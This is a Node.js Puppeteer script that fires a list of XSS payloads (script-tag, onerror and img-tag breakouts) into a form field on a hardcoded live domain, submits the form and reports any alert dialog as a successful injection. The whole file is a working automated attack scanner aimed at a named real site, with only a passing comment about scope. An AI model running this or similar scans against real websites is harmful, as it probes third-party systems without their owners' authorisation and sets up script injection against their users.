const puppeteer = require('puppeteer');

// Common XSS payloads designed to break out of HTML input attribute tags
const payloads = [
    '"><script>alert(1)</script>',
    '" onerror="alert(1)',
    '</script><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>'
];

// Target page containing the interactive form (Ensure this is an allowed in-scope domain)
const targetUrl = 'https://1w.cash'; 

// CHANGE THESE SELECTORS based on what you find using F12 Inspect Element
const INPUT_SELECTOR = 'input[name="username"]'; // Or 'input#elSearchField'
const SUBMIT_SELECTOR = 'button[type="submit"]';  // Or 'button.js-cSearchSubmit'

async function scanFormXSS() {
    console.log(`[+] Initializing Chromium Browser...`);
    const browser = await puppeteer.launch({ headless: true });

    for (let payload of payloads) {
        const page = await browser.newPage();
        
        // 1. Establish the Event Dialog Listener
        page.on('dialog', async dialog => {
            if (dialog.type() === 'alert') {
                console.log(`\n[🚨 XSS DETECTED ON FORM!] Dialog Message: "${dialog.message()}"`);
                console.log(`[🎯 Successful Payload]: ${payload}`);
                await dialog.dismiss();
            }
        });

        try {
            console.log(`[*] Navigating to: ${targetUrl}`);
            await page.goto(targetUrl, { waitUntil: 'networkidle2' });

            // 2. Wait for the form input elements to be visible on the screen
            await page.waitForSelector(INPUT_SELECTOR, { timeout: 5000 });
            await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 5000 });

            // 3. Clear any default text in the box, then type the payload
            await page.click(INPUT_SELECTOR);
            // Select all text and delete it to ensure a clean injection field
            await page.keyboard.down('Control');
            await page.keyboard.press('A');
            await page.keyboard.up('Control');
            await page.keyboard.press('Backspace');
            
            console.log(`[*] Typing payload into form input: ${payload}`);
            await page.type(INPUT_SELECTOR, payload);

            // 4. Click the submit button to post the data
            console.log(`[*] Clicking submit...`);
            await Promise.all([
                page.click(SUBMIT_SELECTOR),
                // Wait for the resulting navigation or backend refresh action to complete
                page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
            ]);

            // Give the browser client-side logic an extra second to execute any potential scripts
            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (error) {
            console.log(`[-] Element target timeout or error processing payload: ${payload}`);
        } finally {
            await page.close();
        }
    }

    console.log(`\n[+] Form Scan Campaign Finished.`);
    await browser.close();
}

scanFormXSS();

